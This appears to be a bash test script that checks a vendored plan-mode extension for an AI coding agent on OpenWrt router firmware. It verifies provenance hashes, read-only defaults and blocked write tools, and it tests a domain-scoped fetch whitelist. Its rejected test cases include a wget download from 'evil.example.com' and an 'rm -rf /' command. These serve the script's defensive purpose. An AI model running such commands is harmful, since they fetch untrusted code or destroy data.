#!/bin/bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
RUNTIME_DIR="$ROOT_DIR/Scripts/node-agent-runtime"
VENDOR_DIR="$RUNTIME_DIR/vendor/pi-plan-mode"
PACKAGE_JSON="$RUNTIME_DIR/package.json"
PROVENANCE="$VENDOR_DIR/provenance.json"
REFRESH_SCRIPT="$ROOT_DIR/Scripts/refresh_pi_plan_mode_vendor.sh"
MIGRATION="$ROOT_DIR/files/etc/uci-defaults/98-pi-plan-mode-vendor-migration"
RECONCILE="$ROOT_DIR/files/usr/sbin/pi-plan-mode-reconcile"
BUMP_SCRIPT="$ROOT_DIR/Scripts/bump_agent_runtime.sh"
WORK_DIR="$(mktemp -d)"
trap 'rm -rf -- "$WORK_DIR"' EXIT

fail() {
  echo "pi-plan-mode vendor guard: $*" >&2
  exit 1
}

for path in "$PACKAGE_JSON" "$VENDOR_DIR/package.json" \
  "$VENDOR_DIR/plan-mode.ts" "$VENDOR_DIR/README.md" "$VENDOR_DIR/LICENSE" \
  "$PROVENANCE" "$REFRESH_SCRIPT" "$MIGRATION" "$RECONCILE" "$BUMP_SCRIPT"; do
  [ -f "$path" ] || fail "missing $path"
done

if grep -Eq '"pi-plan-mode"[[:space:]]*:' "$PACKAGE_JSON"; then
  fail "pi-plan-mode must not remain an npm root dependency"
fi

node - "$PACKAGE_JSON" <<'NODE' || fail "source Pi catalog must remain latest-at-build"
const manifest = require(process.argv[2]);
if (Object.values(manifest.dependencies || {}).some(value => value !== 'latest')) process.exit(1);
NODE
[ ! -e "$RUNTIME_DIR/package-lock.json" ] || fail "source lockfile would freeze Pi/plugin resolution"
bash -n "$BUMP_SCRIPT" || fail "agent bump script does not parse"

node - "$VENDOR_DIR/package.json" "$PROVENANCE" <<'NODE' || fail "vendor metadata is invalid"
const fs = require("node:fs");
const [pkgPath, provenancePath] = process.argv.slice(2);
const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf8"));
const provenance = JSON.parse(fs.readFileSync(provenancePath, "utf8"));
if (pkg.name !== "pi-plan-mode" || pkg.version !== "0.4.8") process.exit(1);
if (pkg.license !== "MIT" || !Array.isArray(pkg.pi?.extensions) || pkg.pi.extensions.length !== 1 || pkg.pi.extensions[0] !== "./plan-mode.ts") process.exit(2);
if (pkg.peerDependencies?.["@earendil-works/pi-ai"] !== "*" || pkg.peerDependencies?.["@earendil-works/pi-coding-agent"] !== ">=0.63.0 <1.0.0") process.exit(3);
if (Object.keys(pkg.peerDependencies || {}).some((name) => name.startsWith("@mariozechner/"))) process.exit(4);
if (provenance.version !== pkg.version || provenance.upstream?.repository !== "qmx/pi-plan-mode" || provenance.upstream?.pull_request !== 9 || !/^[0-9a-f]{40}$/.test(provenance.upstream?.commit || "")) process.exit(5);
if (provenance.npm?.integrity !== "sha512-UZ5mrHNiGgx69cgK01OWR5TzcYFsKiJQg4ERtz3a5wzUtElyR468Lci4JqxkDgbc1dYPUr58Q+YnIj9aEoRiUQ==") process.exit(6);
for (const [name, hash] of Object.entries(provenance.source_sha256 || {})) {
  if (!/^[0-9a-f]{64}$/.test(hash) || !fs.existsSync(require("node:path").join(require("node:path").dirname(provenancePath), name))) process.exit(7);
}
NODE

if grep -Eq '@mariozechner/pi-(coding-agent|ai|tui)' "$VENDOR_DIR/package.json" "$VENDOR_DIR/plan-mode.ts"; then
  fail "vendor source retained the legacy Pi scope"
fi
grep -Fq 'from "@earendil-works/pi-coding-agent"' "$VENDOR_DIR/plan-mode.ts" ||
  fail "vendor extension does not import the maintained Pi agent"
grep -Fq 'from "@earendil-works/pi-ai"' "$VENDOR_DIR/plan-mode.ts" ||
  fail "vendor extension does not import the maintained Pi AI package"
grep -Fq 'let planModeEnabled = true;' "$VENDOR_DIR/plan-mode.ts" ||
  fail "firmware vendor extension does not default new Pi sessions to plan mode"
grep -Fq 'Router agents begin each new session in plan mode' "$VENDOR_DIR/plan-mode.ts" ||
  fail "firmware vendor extension does not document the explicit write escape"
grep -Fq 'pi.setActiveTools(["read", "bash"]);' "$VENDOR_DIR/plan-mode.ts" ||
  fail "plan mode does not hide write tools before agent start"
grep -Fq 'event.toolName === "write" || event.toolName === "edit"' "$VENDOR_DIR/plan-mode.ts" ||
  fail "plan mode does not block direct write/edit calls"

# CommandCode model-catalog fetch must be precisely whitelisted so the
# headless Multica daemon can probe api.commandcode.ai without a human
# clicking "Allow anyway?".  The whitelist must be domain-scoped and must
# reject file-output flags; all other non-safe commands still go to AI review.
grep -Fq 'isCommandCodeModelFetch' "$VENDOR_DIR/plan-mode.ts" ||
  fail "plan mode lacks the CommandCode model-fetch whitelist"
grep -Fq 'api.commandcode.ai' "$VENDOR_DIR/plan-mode.ts" ||
  fail "CommandCode whitelist is not scoped to api.commandcode.ai"
grep -Eq 'FILE_OUTPUT_FLAGS' "$VENDOR_DIR/plan-mode.ts" ||
  fail "CommandCode whitelist does not reject file-output flags"
grep -Fq 'return isCommandCodeModelFetch(trimmed);' "$VENDOR_DIR/plan-mode.ts" ||
  fail "isWhitelisted does not fall through to the CommandCode fetch check"

node - "$VENDOR_DIR/plan-mode.ts" <<'NODE' || fail "CommandCode whitelist functional check failed"
const fs = require("node:fs");
const src = fs.readFileSync(process.argv[2], "utf8");

// Extract the constants and function logic from the vendored source so we
// test the actual shipped logic rather than a reimplementation.
const domain = src.match(/const COMMANDCODE_API_DOMAIN = "([^"]+)"/)[1];
const binaries = new RegExp(src.match(/const COMMANDCODE_FETCH_BINARIES = \/(.+)\//)[1]);
const outputFlags = new RegExp(src.match(/const FILE_OUTPUT_FLAGS = \/(.+)\//)[1]);
const stdoutOutput = new RegExp(src.match(/const STDOUT_OUTPUT = \/(.+)\//)[1]);

function isCCFetch(command) {
  if (!command.includes(domain)) return false;
  if (!binaries.test(command)) return false;
  if (outputFlags.test(command) && !stdoutOutput.test(command)) return false;
  return true;
}

const cases = [
  // Allowed: read-only catalog probes to the CommandCode API domain.
  ["uclient-fetch -q -O - https://api.commandcode.ai/provider/v1/models", true],
  ["curl -s https://api.commandcode.ai/provider/v1/models", true],
  ["wget -qO- https://api.commandcode.ai/provider/v1/models", true],
  ["uclient-fetch https://api.commandcode.ai/provider/v1/models", true],
  ["curl --output=- https://api.commandcode.ai/provider/v1/models", true],
  // Rejected: file-output flags must still go through AI review.
  ["curl -o /tmp/models.json https://api.commandcode.ai/provider/v1/models", false],
  ["uclient-fetch -O /tmp/x.json https://api.commandcode.ai/provider/v1/models", false],
  ["wget --output-document=/tmp/x.json https://api.commandcode.ai/provider/v1/models", false],
  ["curl --output /tmp/x.json https://api.commandcode.ai/provider/v1/models", false],
  ["curl -O https://api.commandcode.ai/provider/v1/models", false],
  // Rejected: other domains / other binaries are not whitelisted.
  ["curl -s https://api.other.com/v1/models", false],
  ["wget https://evil.example.com/script.sh", false],
  ["rm -rf / https://api.commandcode.ai/", false],
];
for (const [cmd, expected] of cases) {
  const got = isCCFetch(cmd);
  if (got !== expected) {
    console.error(`FAIL: isCCFetch(${JSON.stringify(cmd)}) = ${got}, expected ${expected}`);
    process.exit(1);
  }
}
NODE

for term in 'UPSTREAM_PULL_REQUEST=9' 'EXPECTED_SCOPE_PR_HEAD="8bf61ebb34647c1d22848fb951a2234965693cef"' 'dist.integrity' 'source_sha256' 'unexpected archive layout' 'scope migration' 'OpenWrt devices run untrusted/remote agent work'; do
  grep -Fq "$term" "$REFRESH_SCRIPT" || fail "refresh script lacks fail-closed guard: $term"
done
bash -n "$REFRESH_SCRIPT" || fail "refresh script does not parse"

grep -Fq '/tmp/agent-runtime-pi-plan-mode.ts' "$RECONCILE" ||
  fail "migration does not register the vendored extension path"
grep -Fq 'packages' "$RECONCILE" || fail "migration does not preserve Pi packages"
grep -Fq 'JSON.stringify(settings' "$RECONCILE" || fail "migration does not preserve Pi settings"

echo "pi-plan-mode vendor guard test passed"
